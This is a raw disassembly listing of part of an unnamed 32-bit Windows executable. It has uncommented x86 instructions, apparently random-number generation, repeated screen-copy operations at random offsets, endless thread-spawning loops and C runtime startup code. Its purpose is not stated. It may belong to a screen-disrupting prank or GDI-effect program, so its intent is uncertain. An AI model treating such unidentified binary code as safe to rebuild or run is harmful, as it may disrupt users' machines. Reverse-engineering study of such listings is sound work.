  403f52:	51                   	push   %ecx
  403f53:	68 f8 81 41 00       	push   $0x4181f8
  403f58:	ff d6                	call   *%esi
  403f5a:	85 c0                	test   %eax,%eax
  403f5c:	75 08                	jne    0x403f66
  403f5e:	6a 01                	push   $0x1
  403f60:	ff 15 94 00 41 00    	call   *0x410094
  403f66:	8b 0d f8 81 41 00    	mov    0x4181f8,%ecx
  403f6c:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403f70:	50                   	push   %eax
  403f71:	6a 04                	push   $0x4
  403f73:	51                   	push   %ecx
  403f74:	ff d7                	call   *%edi
  403f76:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403f7a:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  403f7f:	81 e7 ff ff ff 7f    	and    $0x7fffffff,%edi
  403f85:	85 c0                	test   %eax,%eax
  403f87:	75 21                	jne    0x403faa
  403f89:	68 40 00 00 f0       	push   $0xf0000040
  403f8e:	6a 01                	push   $0x1
  403f90:	50                   	push   %eax
  403f91:	50                   	push   %eax
  403f92:	68 f8 81 41 00       	push   $0x4181f8
  403f97:	ff d6                	call   *%esi
  403f99:	85 c0                	test   %eax,%eax
  403f9b:	75 08                	jne    0x403fa5
  403f9d:	6a 01                	push   $0x1
  403f9f:	ff 15 94 00 41 00    	call   *0x410094
  403fa5:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  403faa:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  403fae:	51                   	push   %ecx
  403faf:	6a 04                	push   $0x4
  403fb1:	50                   	push   %eax
  403fb2:	ff 15 00 00 41 00    	call   *0x410000
  403fb8:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403fbc:	b8 7d 0c ce c7       	mov    $0xc7ce0c7d,%eax
  403fc1:	f7 e7                	mul    %edi
  403fc3:	8b 74 24 10          	mov    0x10(%esp),%esi
  403fc7:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  403fcd:	c1 ea 05             	shr    $0x5,%edx
  403fd0:	6b c2 29             	imul   $0x29,%edx,%eax
  403fd3:	68 20 00 cc 00       	push   $0xcc0020
  403fd8:	2b f8                	sub    %eax,%edi
  403fda:	b8 87 61 18 86       	mov    $0x86186187,%eax
  403fdf:	f7 e1                	mul    %ecx
  403fe1:	8b c1                	mov    %ecx,%eax
  403fe3:	83 ef 14             	sub    $0x14,%edi
  403fe6:	2b c2                	sub    %edx,%eax
  403fe8:	d1 e8                	shr    $1,%eax
  403fea:	03 c2                	add    %edx,%eax
  403fec:	c1 e8 04             	shr    $0x4,%eax
  403fef:	6b c0 15             	imul   $0x15,%eax,%eax
  403ff2:	57                   	push   %edi
  403ff3:	2b c8                	sub    %eax,%ecx
  403ff5:	83 e9 0a             	sub    $0xa,%ecx
  403ff8:	51                   	push   %ecx
  403ff9:	56                   	push   %esi
  403ffa:	ff 74 24 24          	push   0x24(%esp)
  403ffe:	ff 74 24 2c          	push   0x2c(%esp)
  404002:	6a 00                	push   $0x0
  404004:	6a 00                	push   $0x0
  404006:	56                   	push   %esi
  404007:	ff 15 0c 00 41 00    	call   *0x41000c
  40400d:	56                   	push   %esi
  40400e:	6a 00                	push   $0x0
  404010:	ff 15 70 01 41 00    	call   *0x410170
  404016:	56                   	push   %esi
  404017:	ff 15 48 00 41 00    	call   *0x410048
  40401d:	6a 00                	push   $0x0
  40401f:	68 80 3e 40 00       	push   $0x403e80
  404024:	53                   	push   %ebx
  404025:	ff 15 7c 01 41 00    	call   *0x41017c
  40402b:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  40402f:	b8 01 00 00 00       	mov    $0x1,%eax
  404034:	5f                   	pop    %edi
  404035:	5e                   	pop    %esi
  404036:	5b                   	pop    %ebx
  404037:	33 cc                	xor    %esp,%ecx
  404039:	e8 2c 02 00 00       	call   0x40426a
  40403e:	8b e5                	mov    %ebp,%esp
  404040:	5d                   	pop    %ebp
  404041:	c2 08 00             	ret    $0x8
  404044:	cc                   	int3
  404045:	cc                   	int3
  404046:	cc                   	int3
  404047:	cc                   	int3
  404048:	cc                   	int3
  404049:	cc                   	int3
  40404a:	cc                   	int3
  40404b:	cc                   	int3
  40404c:	cc                   	int3
  40404d:	cc                   	int3
  40404e:	cc                   	int3
  40404f:	cc                   	int3
  404050:	56                   	push   %esi
  404051:	8b 35 7c 01 41 00    	mov    0x41017c,%esi
  404057:	6a 00                	push   $0x0
  404059:	68 80 3e 40 00       	push   $0x403e80
  40405e:	6a 00                	push   $0x0
  404060:	ff d6                	call   *%esi
  404062:	eb f3                	jmp    0x404057
  404064:	cc                   	int3
  404065:	cc                   	int3
  404066:	cc                   	int3
  404067:	cc                   	int3
  404068:	cc                   	int3
  404069:	cc                   	int3
  40406a:	cc                   	int3
  40406b:	cc                   	int3
  40406c:	cc                   	int3
  40406d:	cc                   	int3
  40406e:	cc                   	int3
  40406f:	cc                   	int3
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	83 ec 10             	sub    $0x10,%esp
  404076:	a1 04 70 41 00       	mov    0x417004,%eax
  40407b:	33 c5                	xor    %ebp,%eax
  40407d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404080:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  404085:	53                   	push   %ebx
  404086:	56                   	push   %esi
  404087:	8b 35 04 00 41 00    	mov    0x410004,%esi
  40408d:	57                   	push   %edi
  40408e:	85 c0                	test   %eax,%eax
  404090:	75 23                	jne    0x4040b5
  404092:	68 40 00 00 f0       	push   $0xf0000040
  404097:	6a 01                	push   $0x1
  404099:	6a 00                	push   $0x0
  40409b:	6a 00                	push   $0x0
  40409d:	68 f8 81 41 00       	push   $0x4181f8
  4040a2:	ff d6                	call   *%esi
  4040a4:	85 c0                	test   %eax,%eax
  4040a6:	75 08                	jne    0x4040b0
  4040a8:	6a 01                	push   $0x1
  4040aa:	ff 15 94 00 41 00    	call   *0x410094
  4040b0:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4040b5:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  4040bb:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4040be:	51                   	push   %ecx
  4040bf:	6a 04                	push   $0x4
  4040c1:	50                   	push   %eax
  4040c2:	ff d7                	call   *%edi
  4040c4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4040c7:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  4040cc:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  4040d2:	f7 e1                	mul    %ecx
  4040d4:	c1 ea 03             	shr    $0x3,%edx
  4040d7:	8d 04 92             	lea    (%edx,%edx,4),%eax
  4040da:	03 c0                	add    %eax,%eax
  4040dc:	2b c8                	sub    %eax,%ecx
  4040de:	83 c1 0a             	add    $0xa,%ecx
  4040e1:	e8 aa d2 ff ff       	call   0x401390
  4040e6:	8b d8                	mov    %eax,%ebx
  4040e8:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4040ed:	85 c0                	test   %eax,%eax
  4040ef:	75 21                	jne    0x404112
  4040f1:	68 40 00 00 f0       	push   $0xf0000040
  4040f6:	6a 01                	push   $0x1
  4040f8:	50                   	push   %eax
  4040f9:	50                   	push   %eax
  4040fa:	68 f8 81 41 00       	push   $0x4181f8
  4040ff:	ff d6                	call   *%esi
  404101:	85 c0                	test   %eax,%eax
  404103:	75 08                	jne    0x40410d
  404105:	6a 01                	push   $0x1
  404107:	ff 15 94 00 41 00    	call   *0x410094
  40410d:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  404112:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404115:	51                   	push   %ecx
  404116:	6a 04                	push   $0x4
  404118:	50                   	push   %eax
  404119:	ff d7                	call   *%edi
  40411b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40411e:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  404123:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  404129:	f7 e1                	mul    %ecx
  40412b:	c1 ea 03             	shr    $0x3,%edx
  40412e:	8d 04 92             	lea    (%edx,%edx,4),%eax
  404131:	03 c0                	add    %eax,%eax
  404133:	2b c8                	sub    %eax,%ecx
  404135:	83 c1 0a             	add    $0xa,%ecx
  404138:	e8 53 d2 ff ff       	call   0x401390
  40413d:	8b 0d f8 81 41 00    	mov    0x4181f8,%ecx
  404143:	8b f8                	mov    %eax,%edi
  404145:	85 c9                	test   %ecx,%ecx
  404147:	75 22                	jne    0x40416b
  404149:	68 40 00 00 f0       	push   $0xf0000040
  40414e:	6a 01                	push   $0x1
  404150:	51                   	push   %ecx
  404151:	51                   	push   %ecx
  404152:	68 f8 81 41 00       	push   $0x4181f8
  404157:	ff d6                	call   *%esi
  404159:	85 c0                	test   %eax,%eax
  40415b:	75 08                	jne    0x404165
  40415d:	6a 01                	push   $0x1
  40415f:	ff 15 94 00 41 00    	call   *0x410094
  404165:	8b 0d f8 81 41 00    	mov    0x4181f8,%ecx
  40416b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40416e:	50                   	push   %eax
  40416f:	6a 04                	push   $0x4
  404171:	51                   	push   %ecx
  404172:	ff 15 00 00 41 00    	call   *0x410000
  404178:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  40417c:	75 04                	jne    0x404182
  40417e:	6a 32                	push   $0x32
  404180:	eb 02                	jmp    0x404184
  404182:	6a 15                	push   $0x15
  404184:	57                   	push   %edi
  404185:	53                   	push   %ebx
  404186:	6a 00                	push   $0x0
  404188:	ff 15 74 01 41 00    	call   *0x410174
  40418e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404191:	5f                   	pop    %edi
  404192:	5e                   	pop    %esi
  404193:	33 cd                	xor    %ebp,%ecx
  404195:	5b                   	pop    %ebx
  404196:	e8 cf 00 00 00       	call   0x40426a
  40419b:	8b e5                	mov    %ebp,%esp
  40419d:	5d                   	pop    %ebp
  40419e:	c3                   	ret
  40419f:	cc                   	int3
  4041a0:	56                   	push   %esi
  4041a1:	8b 35 a8 00 41 00    	mov    0x4100a8,%esi
  4041a7:	57                   	push   %edi
  4041a8:	8b 3d 98 00 41 00    	mov    0x410098,%edi
  4041ae:	66 90                	xchg   %ax,%ax
  4041b0:	6a 00                	push   $0x0
  4041b2:	6a 00                	push   $0x0
  4041b4:	6a 00                	push   $0x0
  4041b6:	68 70 40 40 00       	push   $0x404070
  4041bb:	6a 00                	push   $0x0
  4041bd:	6a 00                	push   $0x0
  4041bf:	ff d7                	call   *%edi
  4041c1:	68 dc 05 00 00       	push   $0x5dc
  4041c6:	ff d6                	call   *%esi
  4041c8:	eb e6                	jmp    0x4041b0
  4041ca:	cc                   	int3
  4041cb:	cc                   	int3
  4041cc:	cc                   	int3
  4041cd:	cc                   	int3
  4041ce:	cc                   	int3
  4041cf:	cc                   	int3
  4041d0:	55                   	push   %ebp
  4041d1:	8b ec                	mov    %esp,%ebp
  4041d3:	83 ec 20             	sub    $0x20,%esp
  4041d6:	a1 04 70 41 00       	mov    0x417004,%eax
  4041db:	33 c5                	xor    %ebp,%eax
  4041dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4041e0:	53                   	push   %ebx
  4041e1:	56                   	push   %esi
  4041e2:	57                   	push   %edi
  4041e3:	68 40 42 40 00       	push   $0x404240
  4041e8:	ff 75 08             	push   0x8(%ebp)
  4041eb:	6a 00                	push   $0x0
  4041ed:	6a 00                	push   $0x0
  4041ef:	ff 15 78 01 41 00    	call   *0x410178
  4041f5:	8b 35 90 01 41 00    	mov    0x410190,%esi
  4041fb:	0f 57 c0             	xorps  %xmm0,%xmm0
  4041fe:	8b 3d 94 01 41 00    	mov    0x410194,%edi
  404204:	8b 1d 88 01 41 00    	mov    0x410188,%ebx
  40420a:	0f 11 45 e0          	movups %xmm0,-0x20(%ebp)
  40420e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404215:	66 0f d6 45 f0       	movq   %xmm0,-0x10(%ebp)
  40421a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  404220:	6a 01                	push   $0x1
  404222:	6a 00                	push   $0x0
  404224:	6a 00                	push   $0x0
  404226:	6a 00                	push   $0x0
  404228:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40422b:	50                   	push   %eax
  40422c:	ff d6                	call   *%esi
  40422e:	85 c0                	test   %eax,%eax
  404230:	74 ee                	je     0x404220
  404232:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404235:	50                   	push   %eax
  404236:	ff d7                	call   *%edi
  404238:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40423b:	50                   	push   %eax
  40423c:	ff d3                	call   *%ebx
  40423e:	eb e0                	jmp    0x404220
  404240:	ff 05 fc 81 41 00    	incl   0x4181fc
  404246:	c2 10 00             	ret    $0x10
  404249:	cc                   	int3
  40424a:	cc                   	int3
  40424b:	cc                   	int3
  40424c:	cc                   	int3
  40424d:	cc                   	int3
  40424e:	cc                   	int3
  40424f:	cc                   	int3
  404250:	55                   	push   %ebp
  404251:	8b ec                	mov    %esp,%ebp
  404253:	ff 75 10             	push   0x10(%ebp)
  404256:	8b 45 14             	mov    0x14(%ebp),%eax
  404259:	50                   	push   %eax
  40425a:	50                   	push   %eax
  40425b:	ff 15 8c 01 41 00    	call   *0x41018c
  404261:	b8 01 00 00 00       	mov    $0x1,%eax
  404266:	5d                   	pop    %ebp
  404267:	c2 10 00             	ret    $0x10
  40426a:	3b 0d 04 70 41 00    	cmp    0x417004,%ecx
  404270:	f2 75 02             	bnd jne 0x404275
  404273:	f2 c3                	bnd ret
  404275:	f2 e9 7c 02 00 00    	bnd jmp 0x4044f7
  40427b:	55                   	push   %ebp
  40427c:	8b ec                	mov    %esp,%ebp
  40427e:	5d                   	pop    %ebp
  40427f:	e9 6c 03 00 00       	jmp    0x4045f0
  404284:	56                   	push   %esi
  404285:	6a 02                	push   $0x2
  404287:	e8 12 25 00 00       	call   0x40679e
  40428c:	e8 c8 06 00 00       	call   0x404959
  404291:	50                   	push   %eax
  404292:	e8 95 2e 00 00       	call   0x40712c
  404297:	e8 c1 2f 00 00       	call   0x40725d
  40429c:	8b f0                	mov    %eax,%esi
  40429e:	e8 af 06 00 00       	call   0x404952
  4042a3:	6a 01                	push   $0x1
  4042a5:	89 06                	mov    %eax,(%esi)
  4042a7:	e8 40 04 00 00       	call   0x4046ec
  4042ac:	83 c4 0c             	add    $0xc,%esp
  4042af:	5e                   	pop    %esi
  4042b0:	84 c0                	test   %al,%al
  4042b2:	74 73                	je     0x404327
  4042b4:	db e2                	fnclex
  4042b6:	e8 fe 08 00 00       	call   0x404bb9
  4042bb:	68 e5 4b 40 00       	push   $0x404be5
  4042c0:	e8 e0 05 00 00       	call   0x4048a5
  4042c5:	e8 8b 06 00 00       	call   0x404955
  4042ca:	50                   	push   %eax
  4042cb:	e8 a6 28 00 00       	call   0x406b76
  4042d0:	59                   	pop    %ecx
  4042d1:	59                   	pop    %ecx
  4042d2:	85 c0                	test   %eax,%eax
  4042d4:	75 51                	jne    0x404327
  4042d6:	e8 84 06 00 00       	call   0x40495f
  4042db:	e8 d9 06 00 00       	call   0x4049b9
  4042e0:	85 c0                	test   %eax,%eax
  4042e2:	74 0b                	je     0x4042ef
  4042e4:	68 52 49 40 00       	push   $0x404952
  4042e9:	e8 85 25 00 00       	call   0x406873
  4042ee:	59                   	pop    %ecx
  4042ef:	e8 9b 06 00 00       	call   0x40498f
  4042f4:	e8 96 06 00 00       	call   0x40498f
  4042f9:	e8 70 06 00 00       	call   0x40496e
  4042fe:	e8 4f 06 00 00       	call   0x404952
  404303:	50                   	push   %eax
  404304:	e8 bd 2e 00 00       	call   0x4071c6
  404309:	59                   	pop    %ecx
  40430a:	e8 5c 06 00 00       	call   0x40496b
  40430f:	84 c0                	test   %al,%al
  404311:	74 05                	je     0x404318
  404313:	e8 6f 2a 00 00       	call   0x406d87
  404318:	e8 35 06 00 00       	call   0x404952
  40431d:	e8 fa 07 00 00       	call   0x404b1c
  404322:	85 c0                	test   %eax,%eax
  404324:	75 01                	jne    0x404327
  404326:	c3                   	ret
  404327:	6a 07                	push   $0x7
  404329:	e8 a3 06 00 00       	call   0x4049d1
  40432e:	cc                   	int3
  40432f:	e8 68 06 00 00       	call   0x40499c
  404334:	33 c0                	xor    %eax,%eax
  404336:	c3                   	ret
  404337:	e8 28 08 00 00       	call   0x404b64
  40433c:	e8 11 06 00 00       	call   0x404952
  404341:	50                   	push   %eax
  404342:	e8 e7 2e 00 00       	call   0x40722e
  404347:	59                   	pop    %ecx
  404348:	c3                   	ret
  404349:	6a 14                	push   $0x14
  40434b:	68 30 60 41 00       	push   $0x416030
  404350:	e8 cb 08 00 00       	call   0x404c20
  404355:	6a 01                	push   $0x1
  404357:	e8 57 03 00 00       	call   0x4046b3
  40435c:	59                   	pop    %ecx
  40435d:	84 c0                	test   %al,%al
  40435f:	0f 84 4a 01 00 00    	je     0x4044af
  404365:	32 db                	xor    %bl,%bl
  404367:	88 5d e7             	mov    %bl,-0x19(%ebp)
  40436a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40436e:	e8 0e 03 00 00       	call   0x404681
  404373:	88 45 dc             	mov    %al,-0x24(%ebp)
  404376:	a1 14 7b 41 00       	mov    0x417b14,%eax
  40437b:	33 c9                	xor    %ecx,%ecx
  40437d:	41                   	inc    %ecx
  40437e:	3b c1                	cmp    %ecx,%eax
  404380:	0f 84 29 01 00 00    	je     0x4044af
  404386:	85 c0                	test   %eax,%eax
  404388:	75 49                	jne    0x4043d3
  40438a:	89 0d 14 7b 41 00    	mov    %ecx,0x417b14
  404390:	68 e4 01 41 00       	push   $0x4101e4
  404395:	68 cc 01 41 00       	push   $0x4101cc
  40439a:	e8 9c 2a 00 00       	call   0x406e3b
  40439f:	59                   	pop    %ecx
  4043a0:	59                   	pop    %ecx
  4043a1:	85 c0                	test   %eax,%eax
  4043a3:	74 11                	je     0x4043b6
  4043a5:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4043ac:	b8 ff 00 00 00       	mov    $0xff,%eax
  4043b1:	e9 e9 00 00 00       	jmp    0x40449f
  4043b6:	68 c8 01 41 00       	push   $0x4101c8
  4043bb:	68 c0 01 41 00       	push   $0x4101c0
  4043c0:	e8 1a 2a 00 00       	call   0x406ddf
  4043c5:	59                   	pop    %ecx
  4043c6:	59                   	pop    %ecx
  4043c7:	c7 05 14 7b 41 00 02 	movl   $0x2,0x417b14
  4043ce:	00 00 00 
  4043d1:	eb 05                	jmp    0x4043d8
  4043d3:	8a d9                	mov    %cl,%bl
  4043d5:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4043d8:	ff 75 dc             	push   -0x24(%ebp)
  4043db:	e8 45 04 00 00       	call   0x404825
  4043e0:	59                   	pop    %ecx
  4043e1:	e8 df 05 00 00       	call   0x4049c5
  4043e6:	8b f0                	mov    %eax,%esi
  4043e8:	33 ff                	xor    %edi,%edi
  4043ea:	39 3e                	cmp    %edi,(%esi)
  4043ec:	74 1b                	je     0x404409
  4043ee:	56                   	push   %esi
  4043ef:	e8 9d 03 00 00       	call   0x404791
  4043f4:	59                   	pop    %ecx
  4043f5:	84 c0                	test   %al,%al
  4043f7:	74 10                	je     0x404409
  4043f9:	8b 36                	mov    (%esi),%esi
  4043fb:	57                   	push   %edi
  4043fc:	6a 02                	push   $0x2
  4043fe:	57                   	push   %edi
  4043ff:	8b ce                	mov    %esi,%ecx
  404401:	ff 15 bc 01 41 00    	call   *0x4101bc
  404407:	ff d6                	call   *%esi
  404409:	e8 bd 05 00 00       	call   0x4049cb
  40440e:	8b f0                	mov    %eax,%esi
  404410:	39 3e                	cmp    %edi,(%esi)
  404412:	74 13                	je     0x404427
  404414:	56                   	push   %esi
  404415:	e8 77 03 00 00       	call   0x404791
  40441a:	59                   	pop    %ecx
  40441b:	84 c0                	test   %al,%al
  40441d:	74 08                	je     0x404427
  40441f:	ff 36                	push   (%esi)
  404421:	e8 b8 2c 00 00       	call   0x4070de
  404426:	59                   	pop    %ecx
  404427:	e8 bf 06 00 00       	call   0x404aeb
  40442c:	0f b7 c0             	movzwl %ax,%eax
  40442f:	50                   	push   %eax
  404430:	e8 57 29 00 00       	call   0x406d8c
  404435:	50                   	push   %eax
  404436:	57                   	push   %edi
  404437:	68 00 00 40 00       	push   $0x400000
  40443c:	e8 bf cb ff ff       	call   0x401000
  404441:	8b f0                	mov    %eax,%esi
  404443:	e8 d9 06 00 00       	call   0x404b21
  404448:	84 c0                	test   %al,%al
  40444a:	74 6a                	je     0x4044b6
  40444c:	84 db                	test   %bl,%bl
  40444e:	75 05                	jne    0x404455
  404450:	e8 64 2c 00 00       	call   0x4070b9
  404455:	57                   	push   %edi
  404456:	6a 01                	push   $0x1
  404458:	e8 e5 03 00 00       	call   0x404842
  40445d:	59                   	pop    %ecx
  40445e:	59                   	pop    %ecx
  40445f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404466:	8b c6                	mov    %esi,%eax
  404468:	eb 35                	jmp    0x40449f
  40446a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40446d:	8b 01                	mov    (%ecx),%eax
  40446f:	8b 00                	mov    (%eax),%eax
  404471:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404474:	51                   	push   %ecx
  404475:	50                   	push   %eax
  404476:	e8 aa 21 00 00       	call   0x406625
  40447b:	59                   	pop    %ecx
  40447c:	59                   	pop    %ecx
  40447d:	c3                   	ret
  40447e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404481:	e8 9b 06 00 00       	call   0x404b21
  404486:	84 c0                	test   %al,%al
  404488:	74 32                	je     0x4044bc
  40448a:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  40448e:	75 05                	jne    0x404495
  404490:	e8 15 2c 00 00       	call   0x4070aa
  404495:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40449c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40449f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4044a2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4044a9:	59                   	pop    %ecx
  4044aa:	5f                   	pop    %edi
  4044ab:	5e                   	pop    %esi
  4044ac:	5b                   	pop    %ebx
  4044ad:	c9                   	leave
  4044ae:	c3                   	ret
  4044af:	6a 07                	push   $0x7
  4044b1:	e8 1b 05 00 00       	call   0x4049d1
  4044b6:	56                   	push   %esi
  4044b7:	e8 5a 2c 00 00       	call   0x407116
  4044bc:	ff 75 e0             	push   -0x20(%ebp)
  4044bf:	e8 04 2c 00 00       	call   0x4070c8
  4044c4:	cc                   	int3
  4044c5:	e8 3d 04 00 00       	call   0x404907
  4044ca:	e9 7a fe ff ff       	jmp    0x404349
  4044cf:	55                   	push   %ebp
  4044d0:	8b ec                	mov    %esp,%ebp
  4044d2:	6a 00                	push   $0x0
  4044d4:	ff 15 c4 00 41 00    	call   *0x4100c4
  4044da:	ff 75 08             	push   0x8(%ebp)
  4044dd:	ff 15 c0 00 41 00    	call   *0x4100c0
  4044e3:	68 09 04 00 c0       	push   $0xc0000409
  4044e8:	ff 15 c8 00 41 00    	call   *0x4100c8
  4044ee:	50                   	push   %eax
  4044ef:	ff 15 cc 00 41 00    	call   *0x4100cc
  4044f5:	5d                   	pop    %ebp
  4044f6:	c3                   	ret
  4044f7:	55                   	push   %ebp
  4044f8:	8b ec                	mov    %esp,%ebp
  4044fa:	81 ec 24 03 00 00    	sub    $0x324,%esp
  404500:	6a 17                	push   $0x17
  404502:	e8 85 9e 00 00       	call   0x40e38c
  404507:	85 c0                	test   %eax,%eax
  404509:	74 05                	je     0x404510
  40450b:	6a 02                	push   $0x2
  40450d:	59                   	pop    %ecx
  40450e:	cd 29                	int    $0x29
  404510:	a3 f8 78 41 00       	mov    %eax,0x4178f8
  404515:	89 0d f4 78 41 00    	mov    %ecx,0x4178f4
  40451b:	89 15 f0 78 41 00    	mov    %edx,0x4178f0
  404521:	89 1d ec 78 41 00    	mov    %ebx,0x4178ec
  404527:	89 35 e8 78 41 00    	mov    %esi,0x4178e8
  40452d:	89 3d e4 78 41 00    	mov    %edi,0x4178e4
  404533:	66 8c 15 10 79 41 00 	data16 mov %ss,0x417910
  40453a:	66 8c 0d 04 79 41 00 	data16 mov %cs,0x417904
  404541:	66 8c 1d e0 78 41 00 	data16 mov %ds,0x4178e0
  404548:	66 8c 05 dc 78 41 00 	data16 mov %es,0x4178dc
  40454f:	66 8c 25 d8 78 41 00 	data16 mov %fs,0x4178d8
  404556:	66 8c 2d d4 78 41 00 	data16 mov %gs,0x4178d4
  40455d:	9c                   	pushf
  40455e:	8f 05 08 79 41 00    	pop    0x417908
  404564:	8b 45 00             	mov    0x0(%ebp),%eax
  404567:	a3 fc 78 41 00       	mov    %eax,0x4178fc
  40456c:	8b 45 04             	mov    0x4(%ebp),%eax
  40456f:	a3 00 79 41 00       	mov    %eax,0x417900
  404574:	8d 45 08             	lea    0x8(%ebp),%eax
  404577:	a3 0c 79 41 00       	mov    %eax,0x41790c
  40457c:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  404582:	c7 05 48 78 41 00 01 	movl   $0x10001,0x417848
  404589:	00 01 00 
  40458c:	a1 00 79 41 00       	mov    0x417900,%eax
  404591:	a3 04 78 41 00       	mov    %eax,0x417804
  404596:	c7 05 f8 77 41 00 09 	movl   $0xc0000409,0x4177f8
  40459d:	04 00 c0 
  4045a0:	c7 05 fc 77 41 00 01 	movl   $0x1,0x4177fc
  4045a7:	00 00 00 
  4045aa:	c7 05 08 78 41 00 01 	movl   $0x1,0x417808
  4045b1:	00 00 00 
  4045b4:	6a 04                	push   $0x4
  4045b6:	58                   	pop    %eax
  4045b7:	6b c0 00             	imul   $0x0,%eax,%eax
  4045ba:	c7 80 0c 78 41 00 02 	movl   $0x2,0x41780c(%eax)
  4045c1:	00 00 00 
  4045c4:	6a 04                	push   $0x4
  4045c6:	58                   	pop    %eax
  4045c7:	6b c0 00             	imul   $0x0,%eax,%eax
  4045ca:	8b 0d 04 70 41 00    	mov    0x417004,%ecx
  4045d0:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  4045d4:	6a 04                	push   $0x4
  4045d6:	58                   	pop    %eax
  4045d7:	c1 e0 00             	shl    $0x0,%eax
  4045da:	8b 0d 00 70 41 00    	mov    0x417000,%ecx
  4045e0:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  4045e4:	68 10 02 41 00       	push   $0x410210
  4045e9:	e8 e1 fe ff ff       	call   0x4044cf
  4045ee:	c9                   	leave
  4045ef:	c3                   	ret
  4045f0:	55                   	push   %ebp
  4045f1:	8b ec                	mov    %esp,%ebp
  4045f3:	eb 0d                	jmp    0x404602
  4045f5:	ff 75 08             	push   0x8(%ebp)
  4045f8:	e8 7a 2c 00 00       	call   0x407277
  4045fd:	59                   	pop    %ecx
  4045fe:	85 c0                	test   %eax,%eax
  404600:	74 0f                	je     0x404611
  404602:	ff 75 08             	push   0x8(%ebp)
  404605:	e8 03 2d 00 00       	call   0x40730d
  40460a:	59                   	pop    %ecx
  40460b:	85 c0                	test   %eax,%eax
  40460d:	74 e6                	je     0x4045f5
  40460f:	5d                   	pop    %ebp
  404610:	c3                   	ret
  404611:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  404615:	0f 84 4d 07 00 00    	je     0x404d68
  40461b:	e9 2b 07 00 00       	jmp    0x404d4b
  404620:	55                   	push   %ebp
  404621:	8b ec                	mov    %esp,%ebp
  404623:	a1 04 70 41 00       	mov    0x417004,%eax
  404628:	83 e0 1f             	and    $0x1f,%eax
  40462b:	6a 20                	push   $0x20
  40462d:	59                   	pop    %ecx
  40462e:	2b c8                	sub    %eax,%ecx
  404630:	8b 45 08             	mov    0x8(%ebp),%eax
  404633:	d3 c8                	ror    %cl,%eax
  404635:	33 05 04 70 41 00    	xor    0x417004,%eax
  40463b:	5d                   	pop    %ebp
  40463c:	c3                   	ret
  40463d:	55                   	push   %ebp
  40463e:	8b ec                	mov    %esp,%ebp
  404640:	8b 45 08             	mov    0x8(%ebp),%eax
  404643:	56                   	push   %esi
  404644:	8b 48 3c             	mov    0x3c(%eax),%ecx
  404647:	03 c8                	add    %eax,%ecx
  404649:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40464d:	8d 51 18             	lea    0x18(%ecx),%edx
  404650:	03 d0                	add    %eax,%edx
  404652:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  404656:	6b f0 28             	imul   $0x28,%eax,%esi
  404659:	03 f2                	add    %edx,%esi
  40465b:	3b d6                	cmp    %esi,%edx
  40465d:	74 19                	je     0x404678
  40465f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404662:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  404665:	72 0a                	jb     0x404671
  404667:	8b 42 08             	mov    0x8(%edx),%eax
  40466a:	03 42 0c             	add    0xc(%edx),%eax
  40466d:	3b c8                	cmp    %eax,%ecx
  40466f:	72 0c                	jb     0x40467d
  404671:	83 c2 28             	add    $0x28,%edx
  404674:	3b d6                	cmp    %esi,%edx
  404676:	75 ea                	jne    0x404662
  404678:	33 c0                	xor    %eax,%eax
  40467a:	5e                   	pop    %esi
  40467b:	5d                   	pop    %ebp
  40467c:	c3                   	ret
  40467d:	8b c2                	mov    %edx,%eax
  40467f:	eb f9                	jmp    0x40467a
  404681:	56                   	push   %esi
  404682:	e8 a2 08 00 00       	call   0x404f29
  404687:	85 c0                	test   %eax,%eax
  404689:	74 20                	je     0x4046ab
